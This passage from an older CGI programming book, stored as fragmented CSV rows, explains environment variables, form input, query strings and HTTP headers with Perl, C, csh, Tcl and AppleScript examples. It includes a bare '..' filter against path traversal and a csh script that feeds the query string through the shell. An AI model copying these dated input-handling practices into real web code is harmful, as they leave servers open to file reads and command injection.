 Let's build a short program that delivers a different document depending on whether the browser supports graphics. First, 
 identify the browsers that you know don't support graphics. Then get the name of the browser from the HTTP_USER_AGENT 
 variable:
  
 #!/usr/local/bin/perl 
  
 $nongraphic_browsers = 'Lynx|CERN-LineMode'; 
 $client_browser  = $ENV{'HTTP_USER_AGENT'};",NA
Restricting Access for Specified Domains,"Suppose you have a set of HTML documents: one for users in your IP domain (e.g., bu.edu), and another one for users outside 
 of your domain. Why would anyone want to do this, you may ask? Say you have a document containing internal company 
 phone numbers, meeting schedules, and other company information. You certainly don't want everyone on the Internet to see 
 this document. So you need to set up some type of security to keep your documents away from prying eyes.
  
 You can configure most servers to restrict access to your documents according to what domain the user connects from. For 
 example, under the NCSA server, you can list the domains which you want to allow or deny access to certain directories by 
 editing the access.conf configuration file. However, you can also control domain-based access in a CGI script. The advantage of 
 using a CGI script is that you don't have to turn away other domains, just send them different documents. Let's look at a CGI 
 program that performs pseudo authentication:",NA
User Authentication and Identification,"In addition to domain-based security, most HTTP servers also support a more complicated method of security, known as user 
 authentication. When configured for user authentication, specified files or directories are set up to allow access only by certain 
 users. A user attempting to open the URLs associated with these files is prompted for a name and password.
  
 The user name and password (which, incidentally, need have no relation to the user's real user name and password on any 
 system) is checked by the server, and if legitimate, the user is allowed access. In addition to allowing the user access to the 
 protected file, the server also maintains the user's name and passes it to any subsequent CGI programs that are called. The 
 server passes the user name in the REMOTE_USER environment variable.",NA
Where Did You Come From?,"Companies who provide services on the Web often want to know from what server (or document) the remote users came. For 
 example, say you visit the server located at http://www.cgi.edu, and then from there you go to 
 http://www.flowers.com
 . A CGI 
 program on www.flowers.com can actually determine that you were previously at www.cgi.edu.
  
 How is this useful? For advertising, of course. If a company determines that 90% of all users that visit them come from a certain 
 server, then they can perhaps work something out financially with the webmaster at that server to provide advertising. Also, if 
 your site moves or the content at your site changes dramatically, you can help avoid frustration among your visitors by 
 informing the webmasters at the sites referring to yours to change their links. Here is a simple program that displays this 
 ""referral"" information:
  
 #!/usr/local/bin/perl 
  
 print ""Content-type: text/plain"", ""\n\n""; 
  
 $remote_address = $ENV{'REMOTE_ADDR'}; 
  
 $referral_address = $ENV{'HTTP_REFERER'}; 
  
 print ""Hello user from $remote_address!"", ""\n""; 
  
 print ""The last site you visited was: $referral_address. Am I genius or what?"", ""\n""; 
 exit (0);
  
 The environment variable HTTP_REFERER, which is passed to the server by the client, contains the last site the user visited 
 before accessing the current server.
  
 Now for the caveats. There are three important things you need to remember before using the HTTP_REFERER variable:
  
 G   
 First, not all browsers set this variable.
  
 G   
 Second, if a user accesses your server first, right at startup, this variable will not be set.
  
 G 
  
 Third, if someone accesses your site via a bookmark or just by typing in the URL, the referring document is 
 meaningless. So if you are keeping some sort of count to determine where users are coming from, it won't be totally 
 accurate.
  
  
  
 Introduction
  
  
  
 Accessing Form Input",NA
2.3 Accessing Form Input,"Finally, let's get to form input. We mentioned forms briefly in Chapter 1, 
 The Common Gateway Interface
 , and we'll cover 
 them in more detail in 
 Chapter 4, 
 Forms and CGI
 . But here, we just want to introduce you to the basic concepts behind 
 forms.
  
 As we described in Chapter 1, forms provide a way to get input from users and supply it to a CGI program, as shown in 
 Figure 2.1
 . The Web browser allows the user to select or type in information, and then sends it to the server when the 
 Submit button is pressed. In this chapter, we'll talk a little about how the CGI program accesses the form input.
  
 Figure 2.1: Form interaction with CGI
  
 [Graphic: 
  
 Figure 2-1]",NA
Query Strings,"One way to send form data to a CGI program is by appending the form information to the URL, after a question mark. You 
 may have seen URLs like the following:
  
 http://some.machine/cgi-bin/name.pl?fortune
  
 Up to the question mark (?), the URL should look familiar. It is merely a CGI script being called, by the name name.pl.
  
 What's new here is the part after the ""?"". The information after the ""?"" character is known as a 
 query string
 . When the server 
 is passed a URL with a query string, it calls the CGI program identified in the first part of the URL (before the ""?"") and then 
 stores the part after the ""?"" in the environment variable QUERY_STRING. The following is a CGI program called name.pl 
 that uses query information to execute one of three possible UNIX commands.
  
 #!/usr/local/bin/perl 
  
 print ""Content-type: text/plain"", ""\n\n""; 
  
 $query_string = $ENV{'QUERY_STRING'}; 
  
 if ($query_string eq ""fortune"") {
  
  
  print `/usr/local/bin/fortune`; 
  
 } elsif ($query_string eq ""finger"") {
  
  
  print `/usr/ucb/finger`; 
  
 } else {
  
  
  print `/usr/local/bin/date`; 
  
 } 
  
 exit (0);
  
 You can execute this script as either:
  
 http://some.machine/cgi-bin/name.pl?fortune 
 http://some.machine/cgi-bin/name.pl?finger
  
 or",NA
A Simple Form,"Although the previous example will work, the following example is a more realistic illustration of how forms work with 
 CGI. Instead of supplying the information directly as part of the URL, we'll use a form to solicit it from the user.
  
 (Don't worry about the HTML tags needed to create the form; they are covered in detail in 
 Chapter 4, 
 Forms and CGI
 .)
  
 <HTML> 
  
 <HEAD><TITLE>Simple Form!</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Simple Form!</H1> 
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/unix.pl"" METHOD=""GET""> 
  
 Command: <INPUT TYPE=""text"" NAME=""command"" SIZE=40> 
 <P> 
  
 <INPUT TYPE=""submit"" VALUE=""Submit Form!""> 
  
 <INPUT TYPE=""reset""  VALUE=""Clear Form""> 
  
 </FORM> 
  
 <HR> 
  
 </BODY> 
  
 </HTML>
  
 Since this is HTML, the appearance of the form depends on what browser is being used. 
 Figure 2.2
  shows what the form 
 looks like in Netscape.
  
 Figure 2.2: Simple form in Netscape
  
 [Graphic: 
  
 Figure 2-2]
  
 This form consists of one text field titled ""Command:"" and two buttons. The Submit Form! button is used to send the 
 information in the form to the CGI program specified by the ACTION attribute. The Clear Form button clears the 
 information in the field.
  
 The METHOD=GET attribute to the <FORM> tag in part determines how the data is passed to the server. We'll talk more 
 about different methods soon, but for now, we'll use the default method, GET. Now, assuming that the user enters ""fortune"" 
 into the text field, when the Submit Form! button is pressed the browser sends the following request to the server:
  
 GET /cgi-bin/unix.pl?command=fortune HTTP/1.0",NA
The GET and POST Methods,"In the previous example, we used the GET method to process the form. However, there is another method we can use, 
 called POST. Using the POST method, the server sends the data as an input stream to the program. That is, if in the 
 previous example the <FORM> tag had read:
  
 <FORM ACTION=""unix.pl"" METHOD=""POST"">
  
 the following request would be sent to the server:
  
 POST /cgi-bin/unix.pl HTTP/1.0 
  
 .
  
 . (header information) 
  
 .
  
 Content-length: 15 
  
 command=fortune
  
 The version of 
 unix.pl
  that handles the form with POST data follows. First, since the server passes information to this 
 program as an input stream, it sets the environment variable CONTENT_LENGTH to the size of the data in number of 
 bytes (or characters). We can use this to read exactly that much data from standard input.",NA
Encoded Data,"So far, we've shown an example for retrieving very simple form information. However, form information can get 
 complicated. Since under the GET method the form information is sent as part of the URL, there can't be any spaces or 
 other special characters that are not allowed in URLs. Therefore, some special encoding is used. We'll talk more about this 
 in 
 Chapter 4, 
 Forms and CGI
 , but for now we'll show a very simple example. First the HTML needed to create a form:
  
 <HTML> 
  
 <HEAD><TITLE>When's your birthday?</TITLE></HEAD> 
 <BODY> 
  
 <H1>When's your birthday?</H1>",NA
2.4 Extra Path Information,NA,NA
"Besides passing query information to a CGI script, you can also pass additional data, known as extra path ",NA,NA
"information, as part of the URL. The extra path information depends on the server knowing where the name of the ",NA,NA
"program ends, and understanding that anything following the program name is ""extra."" Here is how you would call a ",NA,NA
script with extra path information:,NA,NA
http://some.machine/cgi-bin/display.pl/cgi/cgi_doc.txt,NA,NA
Since the server knows that ,NA,NA
display.pl,NA,NA
" is the name of the program, the string ""/cgi/cgi_doc.txt"" is stored in the ",NA,NA
"environment variable PATH_INFO. Meanwhile, the variable PATH_TRANSLATED is also set, which maps the ",NA,NA
"information stored in PATH_INFO to the document root directory (e.g., ",NA,NA
/usr/local/etc/httpd/ public/cgi/cgi-doc.txt,NA,NA
).,NA,NA
Here is a CGI script--,NA,NA
display.pl,NA,NA
--that can be used to display text files located in the document root hierarchy:,NA,NA
#!/usr/local/bin/perl ,NA,NA
$plaintext_file = $ENV{'PATH_TRANSLATED'}; ,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
if ($plaintext_file =~ /\.\./) {,NA,NA
" print ""Sorry! You have entered invalid characters in the filename."", ""\n"";",NA,NA
" print ""Please check your specification and try again."", ""\n""; ",NA,NA
} else {,NA,NA
" if (open (FILE, ""<"" . $plaintext_file)) {",NA,NA
 while (<FILE>) {,NA,NA
 print;,NA,NA
 },NA,NA
 close (FILE);,NA,NA
 } else {,NA,NA
" print ""Sorry! The file you specified cannot be read!"", ""\n"";",NA,NA
 } ,NA,NA
} ,NA,NA
exit (0);,NA,NA
"In this example, we perform a simple security check. We make sure that the user didn't pass path information ",NA,NA
"containing "".."". This is so that the user cannot access files located outside of the document root directory.",NA,NA
"Instead of using the PATH_TRANSLATED environment variable, you can use a combination of PATH_INFO and ",NA,NA
"DOCUMENT_ROOT, which contains the physical path to the document root directory. The variable ",NA,NA
PATH_TRANSLATED is equal to the following statement:,NA,NA
"$path_translated = join (""/"", $ENV{'DOCUMENT_ROOT'}, $ENV{'PATH_INFO'};",NA,NA
"However, the DOCUMENT_ROOT variable is not set by all servers, and so it is much safer and easier to use ",NA,NA
PATH_TRANSLATED.,NA,NA
Accessing Form Input,NA,NA
Other Languages Under,NA,NA
UNIX,NA,NA
2.5 Other Languages Under UNIX,"You now know the basics of how to handle and manipulate the CGI input in Perl. If you haven't guessed by now, this 
 book concentrates primarily on examples in Perl, since Perl is relatively easy to follow, runs on all three major 
 platforms, and also happens to be the most popular language for CGI. However, CGI programs can be written in many 
 other languages, so before we continue, let's see how we can accomplish similar things in some other languages, such 
 as C/C++, the C Shell, and Tcl.",NA
C/C++,"Here is a CGI program written in C (but that will also compile under C++) that parses the HTTP_USER_AGENT 
 environment variable and outputs a message, depending on the type of browser:
  
 #include <stdio.h> 
  
 #include <stdlib.h> 
  
 #include <string.h> 
  
 void main (void) 
  
 {
  
  
  char *http_user_agent;
  
  
  printf (""Content-type: text/plain\n\n"");
  
  
  http_user_agent = getenv (""HTTP_USER_AGENT"");
  
  
  if (http_user_agent == NULL) {
  
  
  
  printf (""Oops! Your browser failed to set the HTTP_USER_AGENT "");
   
  
 printf (""environment variable!\n"");
  
  
  } else if (!strncmp (http_user_agent, ""Mosaic"", 6)) {
  
  
  
  printf (""I guess you are sticking with the original, huh?\n"");
  
  
  } else if (!strncmp (http_user_agent, ""Mozilla"", 7)) {
  
  
  
  printf (""Well, you are not alone. A majority of the people are "");
   
  
 printf (""using Netscape Navigator!\n"");
  
  
  } else if (!strncmp (http_user_agent, ""Lynx"", 4)) {
  
  
  
  printf (""Lynx is great, but go get yourself a graphic browser!\n"");
  
  
 } else {
  
  
  
  printf (""I see you are using the %s browser.\n"", http_user_agent);
   
  
 printf (""I don't think it's as famous as Netscape, Mosaic or Lynx!\n"");
  
  }
  
  
  exit (0); 
  
 }
  
 The 
 getenv
  function returns the value of the environment variable, which we store in the 
 http_user_agent
  variable (it's 
 actually a pointer to a string, but don't worry about this terminology). Then, we compare the value in this variable to 
 some of the common browser names with the 
 strncmp
  function. This function searches the 
 http_user_agent
  variable 
 for the specified substring up to a certain position within the entire string.
  
 You might wonder why we're performing a partial search. The reason is that generally, the value returned by the 
 HTTP_USER_AGENT environment variable looks something like this:",NA
C Shell,"The C Shell has some serious limitations and therefore is not recommended for any type of CGI applications. In fact, 
 UNIX guru Tom Christiansen has written a FAQ titled ""Csh Programming Considered Harmful"" detailing the C 
 Shell's problems. Here is a small excerpt from the document:
  
 The csh is seductive because the conditionals are more C-like, so the path of least resistance is chosen and 
 a csh script is written. Sadly, this is a lost cause, and the programmer seldom even realizes it, even when 
 they find that many simple things they wish to do range from cumbersome to impossible in the csh.
  
 However, for completeness sake, here is a simple shell script that is identical to the first 
 unix.pl
  Perl program 
 discussed earlier:
  
 #!/bin/csh 
  
 echo ""Content-type: text/plain"" 
  
 echo """" 
  
 if ($?QUERY_STRING) then
  
  
  set command = `echo $QUERY_STRING | awk 'BEGIN {FS = ""=""} { print $2 }'`
  
  if ($command == ""fortune"") then
  
  
  
  /usr/local/bin/fortune
  
  
  else if ($command == ""finger"") then
  
  
  
  /usr/ucb/finger
  
  
  else 
  
  
  
  /usr/local/bin/date
  
  
  endif 
  
 else
  
  
  /usr/local/bin/date 
  
 endif
  
 The C Shell does not have any inherent functions or operators to manipulate string information. So we have no choice 
 but to use another UNIX utility, such as 
 awk
 , to split the query string and return the data on the right side of the equal 
 sign. Depending on the input from the user, one of several UNIX utilities is called to output some information.
  
 You may notice that the variable QUERY_STRING is exposed to the shell. Generally, this is very dangerous because 
 users can embed shell metacharacters. However, in this case, the variable substitution is done after the `` command is 
 parsed into separate commands. If things happened in the reverse order, we could potentially have a major headache!",NA
Tcl,"The following Tcl program uses an environment variable that we haven't yet discussed up to this point. The 
 HTTP_ACCEPT variable contains a list of all of the MIME content types that a browser can accept and handle. A 
 typical value returned by this variable might look like this:
  
 application/postscript, image/gif, image/jpeg, text/plain, text/html
  
 You can use this information to return different types of data from your CGI document to the client. The program 
 below parses this accept list and outputs each MIME type on a different line:
  
 #!/usr/local/bin/tclsh 
  
 puts ""Content-type: text/plain\n"" 
  
 set http_accept $env(HTTP_ACCEPT)",NA
2.6 Other Languages Under Microsoft Windows,NA,NA
"On Microsoft Windows, your mileage varies according to which Web server you use. The freely ",NA,NA
"available 16-bit server for Windows 3.1, Bob Denny's ",NA,NA
winhttpd,NA,NA
", supports a CGI interface for Perl ",NA,NA
"programs, but it also supports a Windows CGI interface that allows you to write CGI programs in ",NA,NA
"languages like Visual Basic, Delphi, and Visual C++.",NA,NA
"Under Windows NT and Windows 95, available servers are WebSite by O'Reilly & Associates, Inc.",NA,NA
"(developed by Denny as a 32-bit commercial product), NetSite by Netscape, Purveyor by Process ",NA,NA
"Software, and the Internet Server Solution from Microsoft (not yet released as of this writing, but ",NA,NA
"imminent and not easily ignored). There is also another freely available server ( EMWACS), although ",NA,NA
it is not considered as robust as the commercial products.,NA,NA
"All platforms support CGI development in Perl. In addition, WebSite, Netscape, and Microsoft all ",NA,NA
"include Windows CGI interfaces. However, the CGI implementations are all slightly different.",NA,NA
Visual Basic,NA,NA
Visual Basic is perfect for developing CGI applications because it supports numerous features for ,NA,NA
"accessing data in the Windows environment. This includes OLE, DDE, Sockets, and ODBC. ODBC, ",NA,NA
"or Open Database Connectivity, allows you to access a variety of relational and non-relational ",NA,NA
databases. The actual implementation of the Windows CGI interface determines how CGI variables ,NA,NA
"are read from a Visual Basic program. This simple example uses the WebSite 1.0 server, which ",NA,NA
depends on a CGI.BAS module that sets up some global variables representing the CGI variables.,NA,NA
Sub CGI_Main (),NA,NA
" Send (""Content-type: text/plain"")",NA,NA
" Send ("""")",NA,NA
" Send (""Server Name"")",NA,NA
" Send ("""")",NA,NA
" Send (""The server name is: "" & CGI_ServerName)",NA,NA
End Sub,NA,NA
The module function ,NA,NA
Main,NA,NA
 in CGI.BAS calls the user-written ,NA,NA
CGI_Main,NA,NA
 function when executing the ,NA,NA
CGI program. The ,NA,NA
CGI_ServerName,NA,NA
" variable contains the name of the server. As we said, your ",NA,NA
mileage will vary according to which Windows-based server you use.,NA,NA
Perl for Windows NT,NA,NA
"As I mentioned earlier, Perl has been ported to Windows NT as well as to many other platforms, ",NA,NA
"including DOS and Windows 3.1. This makes CGI programming much easier on these platforms, ",NA,NA
because we have access to the powerful pattern-matching abilities and to various extensions to such ,NA,NA
utilities as databases and graphics packages.,NA,NA
Other Languages Under,NA,NA
UNIX,NA,NA
Other Languages on,NA,NA
Macintosh Servers,NA,NA
2.7 Other Languages on Macintosh Servers,"The two commonly used HTTP servers for the Macintosh are WebSTAR and MacHTTP, both of which are nearly identical 
 in their functionality. These servers use AppleEvents to communicate with external applications, such as CGI programs. The 
 language of choice for CGI programming on the Macintosh is AppleScript.",NA
AppleScript,"Though AppleScript does not have very intuitive functions for pattern matching, there exist several CGI extensions, called 
 osax (Open Scripting Architecture eXtended), that make CGI programming very easy. Here is a simple example of an 
 AppleScript CGI:
  
 set crlf to (ASCII character 13) & (ASCII character 10) 
  
 set http_header to ""HTTP/1.0 200 OK"" & crlf & -
  
  ""Server: WebSTAR/1.0 ID/ACGI"" & crlf & -
  
  ""MIME-Version: 1.0"" & crlf & ""Content-type: text/html"" & crlf & crlf
  
 on `event WWWsdoc' path_args -
  
  
  given `class kfor':http_search_args, `class post':post_args, `class 
 meth':method,
  
  
  `class addr':client_address, `class user':username, `class 
 pass':password, 
  
  
  `class frmu':from_user, `class svnm':server_name, `class 
 svpt':server_port,
  
  
  `class scnm':script_name, `class ctyp':content_type, 
 `class refr':referer,
  
  
  `class Agnt':user_agent, `class Kact':action, 
 `class Kapt':action_path,
   
  `class Kcip':client_ip, `class Kfrq':full_request
  
  
  set virtual_document to http_header & -
  
  
  
  ""<H1>Server Software</H1><BR><HR>"" & crlf -
  
  
  
  ""The server that is responding to your request is: "" & server_name & crlf 
 -
   
  ""<BR>"" & crlf
  
  
  return virtual_document 
  
 end `event WWW sdoc'
  
 Although the mechanics of this code might look different from those of previous examples, this AppleScript program 
 functions in exactly the same way. First, the HTTP header that we intend to output is stored in the 
 http_header
  variable. Both 
 MacHTTP and WebSTAR servers require CGI programs to output a complete header. Second, the 
 on
  construct sets up a 
 handler for the ""sdoc"" AppleEvent, which consists of all the ""environment"" information and form data. This event is sent to 
 the CGI program by the server when the client issues a request. Finally, the header and other data are returned for display on 
 the client.",NA
MacPerl,"Yes, Perl has also been ported to the Macintosh! This will allow you to develop your CGI applications in much the same way 
 as you would under the UNIX operating system. However, you need to obtain the MacHTTP CGI Script Extension. This 
 extension allows you to use the associative array 
 %ENV
  to access the various environment variables in MacPerl.",NA
2.8 Examining Environment Variables,"What would the chapter be without a program that displays some of the commonly used environment variables? Here it is:
  
 #!/usr/local/bin/perl 
  
 %list = ('SERVER_SOFTWARE',   'The server software is: ',
  
  
  
  'SERVER_NAME',       'The server hostname, DNS alias, or IP address is: ',
  
  
  'GATEWAY_INTERFACE', 'The CGI specification revision is: ',   
  
  
  
  'SERVER_PROTOCOL',   'The name and revision of info protocol is: ',
  
  
  
 'SERVER_PORT',       'The port number for the server is: ',
  
  
  
  'REQUEST_METHOD',    'The info request method is: ',
  
  
  
  'PATH_INFO',         'The extra path info is: ',
  
  
  
  'PATH_TRANSLATED',   'The translated PATH_INFO is: ',
  
  
  
  'DOCUMENT_ROOT',     'The server document root directory is: ',
  
  
  
  'SCRIPT_NAME',       'The script name is: ',
  
  
  
  'QUERY_STRING',      'The query string is (FORM GET): ',
  
  
  
  'REMOTE_HOST',       'The hostname making the request is: ',
  
  
  
  'REMOTE_ADDR',       'The IP address of the remote host is: ',
  
  
  
  'AUTH_TYPE',         'The authentication method is: ',
  
  
  
  'REMOTE_USER',       'The authenticated user is: ',
  
  
  
  'REMOTE_IDENT',      'The remote user is (RFC 931): ',
  
  
  
  'CONTENT_TYPE',      'The content type of the data is (POST, PUT): ',
   
  
 'CONTENT_LENGTH',    'The length of the content is: ',
  
  
  
  'HTTP_ACCEPT',       'The MIME types that the client will accept are: ',
  
  
  'HTTP_USER_AGENT',   'The browser of the client is: ',
  
  
  
  'HTTP_REFERER',      'The URL of the referer is: '); 
  
 print ""Content-type: text/html"",""\n\n""; 
  
 print ""<HTML>"", ""\n""; 
  
 print  ""<HEAD><TITLE>List of Environment Variables</TITLE></HEAD>"", ""\n""; 
  
 print ""<BODY>"", ""\n""; 
  
 print ""<H1>"", ""CGI Environment Variables"", ""</H1>"", ""<HR>"", ""\n""; 
  
 while ( ($env_var, $info) = each %list ) {
  
  
  print $info, ""<B>"", $ENV{$env_var}, ""</B>"", ""<BR>"",""\n""; 
  
 } 
  
 print ""<HR>"", ""\n""; 
  
 print ""</BODY>"", ""</HTML>"", ""\n""; 
  
 exit (0);
  
 The associative array contains each environment variable and its description. The 
 while
  loop iterates through the array one 
 variable at a time with the 
 each
  command. 
 Figure 2.3
  shows what the output will look in a browser window.
  
 Figure 2.3: Output of example program
  
 [Graphic: 
  
 Figure 2-3]",NA
3. Output from the Common Gateway ,NA,NA
Interface,NA,NA
Contents: ,NA,NA
Overview ,NA,NA
CGI and Response Headers,NA,NA
Accept Types and Content Types,NA,NA
The Content-length Header,NA,NA
Server Redirection,NA,NA
"The ""Expires"" and ""Pragma"" Headers",NA,NA
Status Codes,NA,NA
Complete (Non-Parsed) Headers,NA,NA
3.1 Overview,NA,NA
As described in ,NA,NA
"Chapter 3, ",NA,NA
Output from the Common Gateway Interface,NA,NA
", CGI programs are requested",NA,NA
"like any other regular documents. The difference is that instead of returning a static document, the ",NA,NA
"server executes a program and returns its output. As far as the browser is concerned, however, it ",NA,NA
"expects to get the same kind of response that it gets when it requests any document, and it's up to the ",NA,NA
CGI program to produce output that the browser is comfortable with.,NA,NA
"The most basic output for a CGI program is a simple document in either plain text or HTML, which ",NA,NA
"the browser displays as it would any document on the Web. However, there are other things you can ",NA,NA
"do, such as:",G,NA
Return graphics and other binary data,G,NA
Tell the browser whether to cache the virtual document,G,NA
Send special HTTP status codes to the browser,G,NA
Tell the server to send an existing document,NA,NA
Each of these techniques involves knowing a little bit about returning additional headers from the CGI ,NA,NA
program.,NA,NA
Examining Environment ,NA,NA
Variables,NA,NA
CGI and Response ,NA,NA
Headers,NA,NA
3.2 CGI and Response Headers,"By now, you should be reasonably comfortable designing CGI programs that create simple virtual documents, like 
 this one:
  
 #!/usr/local/bin/perl 
  
 print ""Content-type: text/html"", ""\n\n""; 
  
 print ""<HTML>"", ""\n""; 
  
 print ""<HEAD><TITLE>Simple Virtual HTML Document</TITLE></HEAD>"", ""\n""; 
  
 print ""<BODY>"", ""\n""; 
  
 print ""<H1>"", ""Virtual HTML"", ""</H1>"", ""<HR>"", ""\n""; 
  
 print ""Hey look, I just created a virtual (yep, virtual) HTML document!"", ""\n""; 
 print ""</BODY></HTML>"", ""\n""; 
  
 exit (0);
  
 Up to this point, we have taken the line that outputs ""Content-type"" for granted. But this is only one type of header 
 that CGI programs can use. ""Content-type"" is an HTTP header that contains a MIME content type describing the 
 format of the data that follows. Other headers can describe:
  
 G   
 The size of the data
  
 G 
  
 G 
  
 Another document that the server should return (that is, instead of returning a virtual document created by the 
 script itself)
  
 HTTP status codes
  
 This chapter will discuss how HTTP headers can be used to fine-tune your CGI documents. First, however, 
 Table 3.1 
 provides a quick listing of all the HTTP headers you might find useful.
  
 Table 3.1: Valid HTTP Headers
  
 Header Description
  
 Content-length The length (in bytes) of the output stream. Implies binary data.
  
 Content-type The MIME content type of the output stream.
  
 Expires Date and time when the document is no longer valid and should be reloaded by the browser.
  
 Location Server redirection (cannot be sent as part of a complete header).
  
 Pragma Turns document caching on and off.
  
 Status Status of the request (cannot be sent as part of a complete header).
  
 The following headers are ""understood"" only by Netscape-compatible browsers (i.e., Netscape Navigator and 
 Microsoft Internet Explorer).
  
 Table 3.2: Netscape-Compatible Headers
  
 Header 
  
 Description
  
 Refresh 
  
 Client reloads specified document.
  
 Set-Cookie Client stores specified data. Useful for keeping track of data between requests.",NA
3.3 Accept Types and Content Types,NA,NA
"CGI applications can return nearly any type of virtual document, as long as the client can handle it ",NA,NA
"properly. It can return a plain text file, an HTML file ... or it can send PostScript, PDF, SGML, etc.",NA,NA
"This is why the client sends a list of ""accept types"" it supports, both directly and indirectly through ",NA,NA
"helper applications, to the server when it issues a request. The server stores this information in the ",NA,NA
"environment variable HTTP_ACCEPT, and the CGI program can check this variable to ensure that it ",NA,NA
returns a file in a format the browser can handle.,NA,NA
"It's also why when you are returning a document, the CGI program needs to use the ",NA,NA
Content-type ,NA,NA
"header to notify the client what type of data it is sending, so that the browser can format and display ",NA,NA
the document properly.,NA,NA
Here's a simple snippet of code that checks to see if the browser accepts JPEG or GIF images:,NA,NA
#!/usr/local/bin/perl,NA,NA
"$gif_image = ""logo.gif"";",NA,NA
"$jpeg_image = ""logo.jpg"";",NA,NA
"$plain_text = ""logo.txt"";",NA,NA
$accept_types = $ENV{'HTTP_ACCEPT'};,NA,NA
if ($accept_types =~ m|image/gif|) {,NA,NA
 $html_document = $gif_image;,NA,NA
} elsif ($accept_types =~ m|image/jpeg|) {,NA,NA
 $html_document = $jpeg_image;,NA,NA
} else {,NA,NA
 $html_document = $plain_text;,NA,NA
},NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
We use a regular expression to search the ,NA,NA
$accept_types,NA,NA
 variable for a MIME content type of ,NA,NA
image/gif,NA,NA
 and ,NA,NA
image/jpeg,NA,NA
". Once that's done, you can open the file, read it, and output the data to ",NA,NA
"standard output, like we've seen in previous examples.",NA,NA
CGI and Response Headers,NA,NA
The Content-length Header,NA,NA
3.4 The Content-length Header,NA,NA
"As you've seen in previous examples, we are not limited to dealing just with HTML text (defined by ",NA,NA
the MIME type ,NA,NA
text/html,NA,NA
") but we can also output documents formatted in numerous ways, like plain ",NA,NA
"text, GIF or JPEG images, and even AIFF sound clips. Here is a program that returns a GIF image:",NA,NA
#!/usr/local/bin/perl,NA,NA
"$gif_image = join (""/"", $ENV{'DOCUMENT_ROOT'}, ""icons/tiger.gif"");",NA,NA
"if (open (IMAGE, ""<"" . $gif_image)) {",NA,NA
 $no_bytes = (stat ($gif_image))[7];,NA,NA
" print ""Content-type: image/gif"", ""\n"";",NA,NA
" print ""Content-length: $no_bytes"", ""\n\n"";",NA,NA
The first thing to notice is that the content type is ,NA,NA
image/gif,NA,NA
. This signals the browser that a GIF image ,NA,NA
"will be sent, so the browser knows how to display it.",NA,NA
The next thing to notice is the ,NA,NA
Content-length,NA,NA
 header. The ,NA,NA
Content-length,NA,NA
 header notifies the server of ,NA,NA
the size of the data that you intend to send. This prevents unexpected end-of-data errors from the ,NA,NA
"server when dealing with binary data, because the server will read the specified number of bytes from ",NA,NA
the data stream regardless of any spurious end-of-data characters.,NA,NA
"To get the content length, we use the ",NA,NA
stat,NA,NA
" command, which returns a 13-element array containing the ",NA,NA
"statistics for a given file, to determine the size of the file. The eighth element of this array (index ",NA,NA
"number 7, because arrays are zero-based in Perl) represents the size of the file in bytes. The remainder ",NA,NA
of the script follows:,NA,NA
 print <IMAGE>;,NA,NA
} else {,NA,NA
" print ""Content-type: text/plain"", ""\n\n"";",NA,NA
" print ""Sorry! I cannot open the file $gif_image!"", ""\n"";",NA,NA
},NA,NA
exit (0);,NA,NA
"As is the case with binary files, one read on the file handle will retrieve the entire file. Compare that to ",NA,NA
"text files where one read will return only a single line. As a result, this example is fine when dealing ",NA,NA
"with small graphic files, but is not very efficient with larger files. Now, we'll look at an example that ",NA,NA
reads and displays the graphic file in small pieces:,NA,NA
 #!/usr/local/bin/perl ,NA,NA
"$gif_image = join (""/"", $ENV{'DOCUMENT_ROOT'}, ""icons/tiger.gif""); ",NA,NA
"if (open (IMAGE, ""<"" . $gif_image)) {",NA,NA
 $no_bytes = (stat ($gif_image))[7];,NA,NA
 $piece_size = $no_bytes / 10;,NA,NA
" print ""Content-type: image/gif"", ""\n"";",NA,NA
" print ""Content-length: $no_bytes"", ""\n\n"";",NA,NA
 for ($loop=0; $loop <= $no_bytes; $loop += $piece_size) {,NA,NA
" read (IMAGE, $data, $piece_size);",NA,NA
 print $data;,NA,NA
 },NA,NA
 close (IMAGE); ,NA,NA
} else {,NA,NA
" print ""Content-type: text/plain"", ""\n\n"";",NA,NA
" print ""Sorry! I cannot open the file $gif_image!"", ""\n""; } ",NA,NA
exit (0);,NA,NA
The loop iterates through the file reading and displaying pieces of data that are one-tenth the size of ,NA,NA
the entire binary file.,NA,NA
"As you will see in the following section, you can use server redirection to return existing files much ",NA,NA
more quickly and easily than with CGI programs like the ones described earlier.,NA,NA
Accept Types and Content,NA,NA
Types,NA,NA
Server Redirection,NA,NA
3.5 Server Redirection,NA,NA
"Thus far we've seen CGI examples that return virtual documents created on the fly. However, another ",NA,NA
thing CGI programs can do is to instruct the server to retrieve an existing document and return that ,NA,NA
document instead. This is known as ,NA,NA
server redirection,NA,NA
.,NA,NA
"To perform server redirection, you need to send a ",NA,NA
Location,NA,NA
 header to tell the server what document to ,NA,NA
"send. The server will retrieve the specified document from the Web, giving the appearance that the ",NA,NA
client had ,NA,NA
not,NA,NA
" requested your CGI program, but that document (see ",NA,NA
Figure 3.1,NA,NA
).,NA,NA
Figure 3.1: Server redirection,"[Graphic: 
  
 Figure 3-1]",NA
A common use for this feature is to return a generic document that contains static information. For ,NA,NA
"example, say you have a form for users to fill out, and you want to display a thank-you message after ",NA,NA
someone completes the form. You can have the CGI program create and display the message each ,NA,NA
time it is called. But a more efficient way would be for the program to send instructions to the server ,NA,NA
to redirect and retrieve a file that contains a generic thank-you message.,NA,NA
Suppose you have an HTML file (,NA,NA
thanks.html,NA,NA
") like the one below, that you want to display after the ",NA,NA
user fills out one of your forms:,NA,NA
<HTML>,NA,NA
<HEAD><TITLE>Thank You!</TITLE></HEAD>,NA,NA
<BODY>,NA,NA
<H1>Thank You!</H1>,NA,NA
<HR>,NA,NA
Thank You for filling out this form. We will be using your,NA,NA
input to improve our products.,NA,NA
"Thanks again,",NA,NA
"WWW Software, Inc.",NA,NA
</BODY>,NA,NA
</HTML>,NA,NA
"You could use the programs discussed earlier to return static documents, but it would be ",NA,NA
"counterproductive to do it in that manner. Instead, it is much quicker and simpler to do the following:",NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Location: /thanks.html"", ""\n\n""; ",NA,NA
exit (0);,NA,NA
The server will return the HTML file ,NA,NA
thanks.html,NA,NA
 located in the document root directory. You don't ,NA,NA
have to worry about returning the MIME content type for the document; it is taken care of by the ,NA,NA
server. An important thing to note is that you cannot return any content type headers when you are ,NA,NA
using server redirection.,NA,NA
You can use server redirection to your advantage and design CGI applications like the following:,NA,NA
